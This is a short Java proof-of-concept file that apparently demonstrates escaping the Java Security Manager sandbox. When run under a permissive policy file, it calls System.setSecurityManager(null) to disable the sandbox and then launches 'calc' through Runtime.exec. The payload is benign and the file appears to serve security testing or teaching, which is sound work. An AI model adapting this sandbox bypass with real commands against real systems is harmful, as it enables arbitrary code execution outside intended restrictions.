package com.evil;

public class Poc {
    public static void main(String[] args) {
        //Run with: -Djava.security.manager -Djava.security.policy==set-security-manager.policy
        exec("calc");
        bypass();

    }

    public static void bypass() {
        System.setSecurityManager(null);
        exec("calc");
    }

    public static void exec(String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
